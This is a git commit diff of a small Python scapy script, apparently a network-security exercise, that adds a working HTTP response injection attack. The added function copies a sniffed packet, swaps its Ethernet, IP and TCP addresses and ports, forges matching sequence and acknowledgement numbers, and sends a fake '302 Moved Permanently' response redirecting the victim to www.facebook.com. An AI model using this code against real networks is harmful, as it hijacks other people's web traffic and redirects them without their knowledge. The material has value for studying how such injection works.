fb92af80525a394efb77262b7202477ac2c6e64c
skly3900 <skly3900@gmail.com>
2016-08-25 19:33:41 +0900

    :>

--- http_inject_level3.py
+++ http_inject_level3.py
@@ -1,10 +1,31 @@
-from scapy.all import *
+from scapy.all import *	
+
 def http_302_inject(pkt):
-		string = "HTTP/1.1 302 Moved Permanently\r\n"
-		string += "Location: www.facebook.com\r\n"
-		string += "\r\n"
 		inject_packet = pkt.copy()
+		string = 'HTTP/1.1 302 Moved Permanently\r\n'
+		string += 'Location: www.facebook.com\r\n'
+		string += '\r\n'
+		print'***************************'
 		inject_packet.show()
+		print'***************************'
+		seq_plus =len(pkt[Raw].load)+4
+		print '*<*<*>*&<*<&*<&*<&>*&8'
+		print string
+		print len(string)
+		inject_packet[Ether].src = pkt[Ether].dst
+		inject_packet[Ether].dst = pkt[Ether].src
+		inject_packet[IP].src = pkt[IP].dst
+		inject_packet[IP].dst = pkt[IP].src
+		inject_packet[IP].len = 52 + len(string)
+		inject_packet[TCP].sport = pkt[TCP].dport
+		inject_packet[TCP].dport = pkt[TCP].sport
+		inject_packet[TCP].seq = pkt[TCP].ack
+		inject_packet[TCP].ack = pkt[TCP].seq + seq_plus
+		inject_packet[TCP].flags = 'PA'
+		inject_packet[Raw].load = string
+		inject_packet.show()
+		sendp(inject_packet)
+
 def http_monitor(pkt):
 	if pkt.haslayer(Raw):
 		raw_data = str(pkt[Raw].load)
